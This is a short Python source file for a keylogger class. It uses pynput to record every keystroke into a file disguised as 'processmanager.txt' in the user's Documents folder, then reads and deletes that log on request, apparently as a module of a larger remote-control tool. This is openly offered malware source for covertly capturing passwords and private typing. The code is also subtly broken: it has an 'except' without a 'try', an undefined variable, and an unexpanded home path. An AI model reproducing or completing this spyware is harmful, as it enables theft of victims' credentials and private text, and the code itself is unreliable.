from pynput.keyboard import Listener
from threading import Thread
from termcolor import colored
import os


class Keylogger:
	listener = None

	def __init__(self):
		self.keys = []
		self.isKeyPressed = False

	def __key_press(self, key):
		self.keys.append(key)
		self.isKeyPressed = True
		location = "~/Documents/processmanager.txt"
		if self.isKeyPressed:
			with open(location, "a") as file:
				for key in self.keys:
					k = str(key).replace("'","")
					if k.find("backspace") > 0:
						file.write(" backspcae ")
					elif k.find("space") > 0:
						file.write(" ")
					elif k.find("shift") > 0:
						file.write(" shift ")
					elif k.find("enter") > 0:
						file.write("\n")
					elif k.find("caps_lock") > 0:
						file.write(" capslock ")	
					else:
						file.write(k)		

			self.keys = []
			self.isKeyPressed = False	

	def start_dumps(self):
		global listener
		with Listener(on_press=self.__key_press) as listener:
			listener.join()

	def dump_keys(self):
		location = "~/Documents/processmanager.txt"
			with open(location, "rt") as file:
				keys = file.read()
			os.remove(location)
			return keys
		except FileNotFoundError:
			return f'{colored("[i] ", "yellow")}' + "you haven't captured any keystrokes yet."		

	def stop_dumps(self):
		listener.stop()
		os.remove(location)
			